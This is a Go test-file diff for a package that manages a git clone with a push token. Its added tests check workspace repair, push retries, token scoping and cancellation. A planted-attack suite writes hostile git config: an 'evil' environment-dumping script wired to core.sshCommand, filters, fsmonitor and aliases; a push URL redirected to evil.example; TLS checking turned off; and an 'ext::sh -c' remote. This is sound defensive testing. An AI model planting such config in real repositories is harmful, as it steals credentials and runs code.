@@ -10,6 +10,7 @@ import (
 	"path/filepath"
 	"strings"
 	"testing"
+	"time"
 )
 
 const token = "ghp_workspace_test_token"
@@ -142,6 +143,22 @@ func TestPrepare(t *testing.T) {
 			t.Errorf("README.md = %q on %s", got, git(t, clone, "rev-parse", "--abbrev-ref", "HEAD"))
 		}
 	})
+	t.Run("what a Fire that died mid-command left in .git does not stop the next one", func(t *testing.T) {
+		f := newFixture(t)
+		f.ws.Prepare(ctx)
+		dotGit := filepath.Join(f.ws.Dir(), ".git")
+		write(t, filepath.Join(dotGit, "index.lock"), "")
+		write(t, filepath.Join(dotGit, "rebase-merge", "head-name"), "refs/heads/feat/issue-7\n")
+		write(t, filepath.Join(dotGit, "MERGE_HEAD"), git(t, f.ws.Dir(), "rev-parse", "HEAD")+"\n")
+		if _, err := f.ws.Prepare(ctx); err != nil {
+			t.Fatal(err)
+		}
+		for _, leftover := range []string{"index.lock", "rebase-merge", "MERGE_HEAD"} {
+			if _, err := os.Stat(filepath.Join(dotGit, leftover)); err == nil {
+				t.Errorf(".git/%s survived Prepare", leftover)
+			}
+		}
+	})
 	t.Run("nothing outside the State dir is touched", func(t *testing.T) {
 		f := newFixture(t)
 		f.ws.Prepare(ctx)
@@ -159,12 +176,28 @@ func TestPrepare(t *testing.T) {
 			t.Errorf("the test root now holds %q: something was written outside the State dir (HOME would be %q)", got, "home")
 		}
 	})
-	t.Run("a clone of some other repo is refused, not reset", func(t *testing.T) {
-		f := newFixture(t)
-		f.ws.Prepare(ctx)
-		elsewhere := f.workspace(filepath.Join(f.root, "another.git"))
-		if _, err := elsewhere.Prepare(ctx); err == nil || !strings.Contains(err.Error(), "is a clone of") {
-			t.Errorf("Prepare = %v", err)
+	t.Run("a clone that is no longer one is made again", func(t *testing.T) {
+		for name, wreck := range map[string]func(clone string){
+			".git removed": func(clone string) { os.RemoveAll(filepath.Join(clone, ".git")) },
+			".git replaced by a file": func(clone string) {
+				os.RemoveAll(filepath.Join(clone, ".git"))
+				write(t, filepath.Join(clone, ".git"), "gitdir: /elsewhere\n")
+			},
+			".git replaced by a link": func(clone string) {
+				os.RemoveAll(filepath.Join(clone, ".git"))
+				os.Symlink(filepath.Join(filepath.Dir(clone), "..", "other", ".git"), filepath.Join(clone, ".git"))
+			},
+		} {
+			f := newFixture(t)
+			f.ws.Prepare(ctx)
+			wreck(f.ws.Dir())
+			created, err := f.ws.Prepare(ctx)
+			if err != nil || !created || git(t, f.ws.Dir(), "rev-parse", "--abbrev-ref", "HEAD") != "trunk" {
+				t.Errorf("%s: Prepare = %v, %v", name, created, err)
+			}
+			if got := git(t, f.other, "status", "--porcelain"); got != "" {
+				t.Errorf("%s: the other checkout was touched:\n%s", name, got)
+			}
 		}
 	})
 	t.Run("a remote that cannot be reached fails the Prepare; the clone is left as it was", func(t *testing.T) {
@@ -224,7 +257,7 @@ func TestCommitAndPush(t *testing.T) {
 		write(t, filepath.Join(clone, "README.md"), "edited\n")
 		message := "feat(pick): the new thing (#7)\n\nA body with \"quotes\" and a\nsecond line.\n"
 		commit, err := f.ws.CommitAndPush(ctx, branch, message)
-		if err != nil || commit.Empty || commit.SHA == "" {
+		if err != nil || commit.Empty() || commit.SHA == "" {
 			t.Fatalf("CommitAndPush = %+v, %v", commit, err)
 		}
 		if got := f.remoteRef("refs/heads/feat/issue-7"); got != commit.SHA {
@@ -246,11 +279,54 @@ func TestCommitAndPush(t *testing.T) {
 		branch, _ := f.ws.OpenBranch(ctx, 7)
 		before := git(t, f.ws.Dir(), "rev-parse", "HEAD")
 		commit, err := f.ws.CommitAndPush(ctx, branch, "feat: nothing")
-		if err != nil || !commit.Empty || commit.SHA != "" {
+		if err != nil || !commit.Empty() || commit.SHA != "" {
 			t.Errorf("CommitAndPush = %+v, %v", commit, err)
 		}
 		if git(t, f.ws.Dir(), "rev-parse", "HEAD") != before || f.remoteRef("refs/heads/feat/issue-7") != "" {
 			t.Error("an empty change set was committed or pushed")
+		}
+	})
+	t.Run("a commit whose push failed is pushed by the next call, not stranded", func(t *testing.T) {
+		f := newFixture(t)
+		f.ws.Prepare(ctx)
+		branch, _ := f.ws.OpenBranch(ctx, 7)
+		write(t, filepath.Join(f.ws.Dir(), "a.txt"), "a\n")
+		os.Rename(f.remote, f.remote+".down")
+		if _, err := f.ws.CommitAndPush(ctx, branch, "feat: a"); err == nil {
+			t.Fatal("the push succeeded with the remote down")
+		}
+		os.Rename(f.remote+".down", f.remote)
+		commit, err := f.ws.CommitAndPush(ctx, branch, "feat: a")
+		if err != nil || commit.Empty() || commit.SHA == "" || f.remoteRef("refs/heads/feat/issue-7") != commit.SHA {
+			t.Errorf("retry = %+v, %v; the remote has %q", commit, err, f.remoteRef("refs/heads/feat/issue-7"))
+		}
+		if again, _ := f.ws.CommitAndPush(ctx, branch, "feat: a"); !again.Empty() {
+			t.Errorf("a third call = %+v, want Empty: everything is pushed", again)
+		}
+	})
+	t.Run("commits a Step made itself are pushed", func(t *testing.T) {
+		f := newFixture(t)
+		f.ws.Prepare(ctx)
+		branch, _ := f.ws.OpenBranch(ctx, 7)
+		write(t, filepath.Join(f.ws.Dir(), "a.txt"), "a\n")
+		git(t, f.ws.Dir(), "add", "-A")
+		git(t, f.ws.Dir(), "commit", "--quiet", "-m", "the Step's own commit")
+		commit, err := f.ws.CommitAndPush(ctx, branch, "feat: unused")
+		if err != nil || commit.Empty() || f.remoteRef("refs/heads/feat/issue-7") != commit.SHA {
+			t.Errorf("CommitAndPush = %+v, %v", commit, err)
+		}
+	})
+	t.Run("a branch carried on from the remote with nothing new is Empty", func(t *testing.T) {
+		f := newFixture(t)
+		git(t, f.other, "checkout", "--quiet", "-b", "feat/issue-7")
+		write(t, filepath.Join(f.other, "wip.txt"), "earlier\n")
+		git(t, f.other, "add", "-A")
+		git(t, f.other, "commit", "--quiet", "-m", "earlier")
+		git(t, f.other, "push", "--quiet", "origin", "feat/issue-7")
+		f.ws.Prepare(ctx)
+		branch, _ := f.ws.OpenBranch(ctx, 7)
+		if commit, err := f.ws.CommitAndPush(ctx, branch, "feat: nothing"); err != nil || !commit.Empty() {
+			t.Errorf("CommitAndPush = %+v, %v", commit, err)
 		}
 	})
 	t.Run("a second commit on the same branch is pushed on top of the first", func(t *testing.T) {
@@ -300,8 +376,10 @@ func TestCommitAndPush(t *testing.T) {
 		if _, err := f.ws.CommitAndPush(ctx, "feat/issue-8", "feat: a"); err == nil || !strings.Contains(err.Error(), "feat/issue-7") {
 			t.Errorf("CommitAndPush = %v", err)
 		}
-		if _, err := f.ws.CommitAndPush(ctx, "trunk", "feat: a"); err == nil {
-			t.Error("a commit to the default branch was allowed")
+		for _, branch := range []string{"trunk", ""} {
+			if _, err := f.ws.CommitAndPush(ctx, branch, "feat: a"); err == nil || !strings.Contains(err.Error(), "never commits to") {
+				t.Errorf("CommitAndPush to %q = %v", branch, err)
+			}
 		}
 	})
 	t.Run("hooks and config a Step planted in the clone are not run or obeyed", func(t *testing.T) {
@@ -419,33 +497,191 @@ func TestTokenHandling(t *testing.T) {
 		return []string{"PATH=/usr/bin", "GIT_DIR=/elsewhere", "GIT_SSH_COMMAND=ssh -i key", "GIT_CONFIG_COUNT=1", "GIT_CONFIG_KEY_0=core.hooksPath", "GIT_CONFIG_VALUE_0=/evil"}
 	}}
 	t.Run("only a command that talks to the remote is given the token", func(t *testing.T) {
-		if holdsToken(ws.env(false)) || !holdsToken(ws.env(true)) {
-			t.Errorf("local env holds the token: %v; network env: %v", holdsToken(ws.env(false)), holdsToken(ws.env(true)))
+		if holdsToken(ws.env(command{})) || !holdsToken(ws.env(command{remote: true})) {
+			t.Errorf("local env holds the token: %v; network env: %v", holdsToken(ws.env(command{})), holdsToken(ws.env(command{remote: true})))
 		}
 	})
 	t.Run("the token is scoped to the remote's host", func(t *testing.T) {
-		if env := strings.Join(ws.env(true), "\n"); !strings.Contains(env, "=http.https://github.com/.extraheader") {
+		if env := strings.Join(ws.env(command{remote: true}), "\n"); !strings.Contains(env, "=http.https://github.com/.extraheader") {
 			t.Errorf("env = %s", env)
 		}
 	})
 	t.Run("a remote that is not HTTP is never sent the token", func(t *testing.T) {
-		for _, remote := range []string{"git@github.com:acme/widgets.git", "/srv/git/widgets.git", "ssh://git@github.com/acme/widgets", "file:///srv/widgets.git"} {
+		for _, remote := range []string{
+			"git@github.com:acme/widgets.git", "/srv/git/widgets.git", "ssh://git@github.com/acme/widgets", "file:///srv/widgets.git",
+			"http://github.com/acme/widgets.git", "https://someone@github.com/acme/widgets.git",
+		} {
 			other := &Workspace{Remote: remote, Token: token, Environ: ws.Environ}
-			if holdsToken(other.env(true)) {
+			if holdsToken(other.env(command{remote: true})) {
 				t.Errorf("the token is in the environment for %s", remote)
 			}
 		}
 	})
 	t.Run("nothing inherited steers git", func(t *testing.T) {
-		env := strings.Join(ws.env(true), "\n")
+		env := strings.Join(ws.env(command{remote: true}), "\n")
 		if strings.Contains(env, "/elsewhere") || strings.Contains(env, "ssh -i key") || strings.Contains(env, "/evil") || !strings.Contains(env, "PATH=/usr/bin") {
 			t.Errorf("env = %s", env)
+		}
+	})
+	t.Run("the Daemon's own GitHub token never reaches git's environment", func(t *testing.T) {
+		leaky := &Workspace{StateDir: "/state", Remote: "https://github.com/acme/widgets.git", Token: token, Environ: func() []string {
+			return []string{"PATH=/usr/bin", "GH_TOKEN=" + token, "GITHUB_TOKEN=" + token, "HOME=/home/someone", "CLAUDE_CODE_OAUTH_TOKEN=claude-secret", "SSH_AUTH_SOCK=/run/agent"}
+		}}
+		env := strings.Join(leaky.env(command{}), "\n")
+		if strings.Contains(env, token) || strings.Contains(env, "claude-secret") || strings.Contains(env, "/home/someone") || strings.Contains(env, "/run/agent") {
+			t.Errorf("env = %s", env)
+		}
+		if !strings.Contains(env, "HOME=/state/git-home") {
+			t.Errorf("git's home is not its own: %s", env)
+		}
+	})
+	t.Run("git may speak only the remote's protocol, and never follows a redirect", func(t *testing.T) {
+		for remote, want := range map[string]string{
+			"https://github.com/acme/widgets.git": "https", "/srv/git/widgets.git": "file", "git@github.com:acme/widgets.git": "ssh",
+			"ssh://git@github.com/acme/widgets": "ssh", "ext::sh -c evil": "none", "file:///srv/widgets.git": "file",
+		} {
+			env := strings.Join((&Workspace{Remote: remote}).env(command{remote: true}), "\n")
+			if !strings.Contains(env, "GIT_ALLOW_PROTOCOL="+want+"\n") {
+				t.Errorf("%s: want GIT_ALLOW_PROTOCOL=%s in\n%s", remote, want, env)
+			}
+			if !strings.Contains(env, "=http.followRedirects\n") {
+				t.Errorf("%s: redirects are not switched off", remote)
+			}
 		}
 	})
 	t.Run("the token is scrubbed from any text that leaves the package", func(t *testing.T) {
 		got := ws.scrub("fatal: bad header 'Authorization: Basic " + basicAuth(token) + "' for " + token)
 		if strings.Contains(got, token) || strings.Contains(got, basicAuth(token)) || !strings.Contains(got, "<token>") {
 			t.Errorf("scrub = %q", got)
+		}
+	})
+}
+
+// What a Step could plant in the clone to run code with the token, or to
+// send the token somewhere else. Each must fail to do either.
+func TestPlantedAttacks(t *testing.T) {
+	// proof is a file an attack would write; evil is a program that writes
+	// its whole environment there.
+	setup := func(t *testing.T) (f *fixture, proof, evil string) {
+		f = newFixture(t)
+		environ := f.ws.Environ
+		f.ws.Environ = func() []string { return append(environ(), "GH_TOKEN="+token, "GITHUB_TOKEN="+token) }
+		f.ws.Prepare(ctx)
+		f.ws.OpenBranch(ctx, 7)
+		proof = filepath.Join(f.root, "state", "attack-ran")
+		evil = filepath.Join(f.root, "state", "evil")
+		write(t, evil, "#!/bin/sh\nenv > '"+proof+"'\ncat\n")
+		return f, proof, evil
+	}
+	finish := func(t *testing.T, f *fixture, proof string) {
+		t.Helper()
+		write(t, filepath.Join(f.ws.Dir(), "a.txt"), "a\n")
+		commit, err := f.ws.CommitAndPush(ctx, "feat/issue-7", "feat: a")
+		if err != nil || f.remoteRef("refs/heads/feat/issue-7") != commit.SHA || commit.Empty() {
+			t.Errorf("CommitAndPush = %+v, %v; the remote has %q", commit, err, f.remoteRef("refs/heads/feat/issue-7"))
+		}
+		if _, err := f.ws.Prepare(ctx); err != nil {
+			t.Errorf("the next Prepare: %v", err)
+		}
+		if got, err := os.ReadFile(proof); err == nil {
+			t.Errorf("planted code ran; its environment held the token: %v", strings.Contains(string(got), token) || strings.Contains(string(got), basicAuth(token)))
+		}
+	}
+	t.Run("a rewritten push URL with a planted ssh command", func(t *testing.T) {
+		f, proof, evil := setup(t)
+		git(t, f.ws.Dir(), "config", "url.ssh://x@evil.example/r.insteadOf", f.remote)
+		git(t, f.ws.Dir(), "config", "core.sshCommand", evil)
+		finish(t, f, proof)
+	})
+	t.Run("a clean filter named by .gitattributes", func(t *testing.T) {
+		f, proof, evil := setup(t)
+		git(t, f.ws.Dir(), "config", "filter.x.clean", evil)
+		git(t, f.ws.Dir(), "config", "filter.x.smudge", evil)
+		write(t, filepath.Join(f.ws.Dir(), ".gitattributes"), "* filter=x\n")
+		write(t, filepath.Join(f.ws.Dir(), ".git", "info", "attributes"), "* filter=x\n")
+		finish(t, f, proof)
+	})
+	t.Run("a config that includes another, and a per-worktree config", func(t *testing.T) {
+		f, proof, evil := setup(t)
+		write(t, filepath.Join(f.root, "state", "extra.config"), "[core]\n\tsshCommand = "+evil+"\n\tfsmonitor = "+evil+"\n[alias]\n\tadd = !"+evil+"\n")
+		git(t, f.ws.Dir(), "config", "include.path", filepath.Join(f.root, "state", "extra.config"))
+		git(t, f.ws.Dir(), "config", "extensions.worktreeConfig", "true")
+		write(t, filepath.Join(f.ws.Dir(), ".git", "config.worktree"), "[core]\n\tfsmonitor = "+evil+"\n\tpager = "+evil+"\n\teditor = "+evil+"\n")
+		finish(t, f, proof)
+	})
+	t.Run("a proxy, a resolver override and no TLS checking", func(t *testing.T) {
+		f, proof, _ := setup(t)
+		for key, value := range map[string]string{"http.proxy": "http://127.0.0.1:1", "http.sslVerify": "false", "http.curloptResolve": "github.com:443:127.0.0.1", "core.gitProxy": "/nonexistent"} {
+			git(t, f.ws.Dir(), "config", key, value)
+		}
+		finish(t, f, proof)
+		if got, _ := os.ReadFile(filepath.Join(f.ws.Dir(), ".git", "config")); strings.Contains(string(got), "[http]") || strings.Contains(string(got), "gitProxy") || strings.Contains(string(got), "sslVerify") {
+			t.Errorf("the clone's config still holds:\n%s", got)
+		}
+	})
+	t.Run("a worktree pointed outside the State dir", func(t *testing.T) {
+		f, proof, _ := setup(t)
+		victim := filepath.Join(f.root, "other")
+		write(t, filepath.Join(victim, "precious-untracked.txt"), "keep me\n")
+		git(t, f.ws.Dir(), "config", "core.worktree", victim)
+		if _, err := f.ws.Prepare(ctx); err != nil {
+			t.Fatal(err)
+		}
+		if got, _ := os.ReadFile(filepath.Join(victim, "precious-untracked.txt")); string(got) != "keep me\n" {
+			t.Error("Prepare cleaned a directory outside the State dir")
+		}
+		f.ws.OpenBranch(ctx, 7)
+		finish(t, f, proof)
+	})
+	t.Run("a remote-tracking ref planted as a link to the Step's own history", func(t *testing.T) {
+		f, _, _ := setup(t)
+		clone := f.ws.Dir()
+		write(t, filepath.Join(clone, "planted.txt"), "attacker history\n")
+		git(t, clone, "add", "-A")
+		git(t, clone, "commit", "--quiet", "-m", "planted")
+		git(t, clone, "branch", "--quiet", "-f", "stash-it")
+		write(t, filepath.Join(clone, ".git", "refs", "remotes", "origin", "feat", "issue-9"), "ref: refs/heads/stash-it\n")
+		if _, err := f.ws.Prepare(ctx); err != nil {
+			t.Fatal(err)
+		}
+		if _, err := f.ws.OpenBranch(ctx, 9); err != nil {
+			t.Fatal(err)
+		}
+		if _, err := os.Stat(filepath.Join(clone, "planted.txt")); err == nil {
+			t.Error("a new ticket's branch started from history the remote never had")
+		}
+	})
+	t.Run("a repository a Step made inside the checkout is committed as files, not as a pointer", func(t *testing.T) {
+		f, _, _ := setup(t)
+		nested := filepath.Join(f.ws.Dir(), "vendor", "lib")
+		write(t, filepath.Join(nested, "lib.go"), "package lib\n")
+		git(t, nested, "init", "--quiet")
+		git(t, nested, "add", "-A")
+		git(t, nested, "commit", "--quiet", "-m", "nested")
+		commit, err := f.ws.CommitAndPush(ctx, "feat/issue-7", "feat: vendored")
+		if err != nil {
+			t.Fatal(err)
+		}
+		if got := git(t, f.remote, "ls-tree", "-r", commit.SHA, "vendor"); !strings.Contains(got, " blob ") || !strings.Contains(got, "vendor/lib/lib.go") || strings.Contains(got, "160000") {
+			t.Errorf("the commit's vendor tree:\n%s", got)
+		}
+	})
+}
+
+func TestCancellation(t *testing.T) {
+	t.Run("a cancelled git command returns promptly even when a child holds its pipes", func(t *testing.T) {
+		f := newFixture(t)
+		slow := filepath.Join(f.root, "slow-git")
+		write(t, slow, "#!/bin/sh\nsleep 300 &\nwait\n")
+		f.ws.Git = slow
+		cancelled, cancel := context.WithTimeout(ctx, 200*time.Millisecond)
+		defer cancel()
+		start := time.Now()
+		if _, err := f.ws.Prepare(cancelled); err == nil {
+			t.Error("a cancelled Prepare succeeded")
+		}
+		if elapsed := time.Since(start); elapsed > killGrace+3*time.Second {
+			t.Errorf("the cancelled command took %s", elapsed)
 		}
 	})
 }
